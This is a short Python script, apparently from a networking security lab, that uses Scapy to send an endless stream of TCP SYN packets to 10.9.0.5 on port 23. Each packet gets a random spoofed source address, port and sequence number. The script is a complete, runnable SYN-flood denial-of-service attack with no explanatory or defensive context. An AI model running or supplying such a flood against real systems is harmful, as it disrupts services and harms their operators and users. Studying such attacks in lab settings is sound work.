#!/usr/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

target_ip = "10.9.0.5"
target_port = 23

ip = IP(dst=target_ip)

tcp = TCP(dport=target_port, flags='S')

pkt = ip/tcp

print(f"Sending SYN packets to {target_ip}:{target_port} ...")

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    
    pkt[TCP].sport = getrandbits(16)
    
    pkt[TCP].seq = getrandbits(32)
    
    send(pkt, verbose=0)